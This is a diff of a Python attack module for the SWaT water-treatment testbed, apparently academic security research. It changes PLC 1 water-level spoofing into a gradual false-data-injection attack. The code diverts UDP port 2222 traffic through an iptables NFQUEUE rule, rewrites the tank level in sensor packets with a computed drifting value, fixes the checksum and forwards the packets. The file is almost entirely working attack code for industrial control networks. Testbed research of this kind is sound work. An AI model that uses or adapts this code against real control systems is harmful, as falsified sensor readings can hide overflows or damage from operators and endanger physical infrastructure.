@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-# Copyright (c) 2015 David I. Urbina, UTD
+# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -20,37 +20,48 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 # THE SOFTWARE.
 """Secure Water Testbed (SWaT) Singapore University of Technology and Design.
-SWATAttack module to spoof water level and flow in PLC 1.
+SWATAttack module to change the slope of the water level by calculating with a
+constant bias to the water flow in PLC 1.
 """
 from __future__ import print_function
-from netfilterqueue import NetfilterQueue
+
+import math
 import os
+import sys
+from netfilterqueue import NetfilterQueue
 
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import swat
-import filters
 import scaling
+import swat
+from commons.util import RepeatEvery
+
+DIA = 1.38  # Tank 1 diameter
+FLOW_BIAS = 0.8  # Water flow in m^3/h
+_alevel = 0
+_elevel = 0
+_is_first_pck = True
 
 
-# Parameters list
-flow = 0
-sflow = 0
-level = 0
-_init = True
+def calculate_attack():
+    global _alevel
+    _alevel += (FLOW_BIAS / (3600 * math.pi * math.pow(DIA / 2, 2)))
 
 
-def __spoof(packet):
+thread = RepeatEvery(1, calculate_attack)
+
+
+def __inject(packet):
     pkt = IP(packet.get_payload())
     if swat.SWAT_P1_RIO_AI in pkt:
-        global _init, level
-        if _init:
-            level = pkt[swat.SWAT_P1_RIO_AI].level
-            _init = False
-        level += 5
-        pkt[swat.SWAT_P1_RIO_AI].level = level
-        pkt[swat.SWAT_P1_RIO_AI].flow = flow
+        global _elevel, _alevel, _is_first_pck
+        if _is_first_pck:
+            _elevel = _alevel = scaling.current_to_signal(pkt[swat.SWAT_P1_RIO_AI].level, scaling.P1Level) / 1000
+            thread.start()
+            _is_first_pck = False
+        alevel = scaling.signal_to_current(_alevel * 1000, scaling.P1Level)
+        pkt[swat.SWAT_P1_RIO_AI].level = alevel
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
@@ -60,30 +71,38 @@ def __spoof(packet):
 def start():
     __setup()
     nfqueue = NetfilterQueue()
-    nfqueue.bind(0, __spoof)
+    nfqueue.bind(0, __inject)
     try:
-        print("[*] starting water level and flow spoofing")
+        print("[*] starting water level spoofing")
         nfqueue.run()
     except KeyboardInterrupt:
         __setdown()
-        print("[*] stopping water level and flow spoofing")
+        thread.stop()
+        thread.join()
         nfqueue.unbind()
+        print("[*] stopping water level spoofing")
+    return 0
 
 
 def configure():
-    global sflow, flow
-    sflow = input('Set level (m^2/h): ')
-    flow = filters.reverse_scale(sflow, scaling.P1Flow)
+    global FLOW_BIAS
+    FLOW_BIAS = input('Set Water Flow Bias: ')
     params()
 
 
 def params():
-    print('Flow: {} m^2/h ({})'.format(sflow, flow))
+    print('Water FLow Bias: ', FLOW_BIAS)
 
 
 def __setup():
+    global _is_first_pck
+    _is_first_pck = True
     os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')
 
 
 def __setdown():
     os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')
+
+
+if __name__ == '__main__':
+    sys.exit(start())
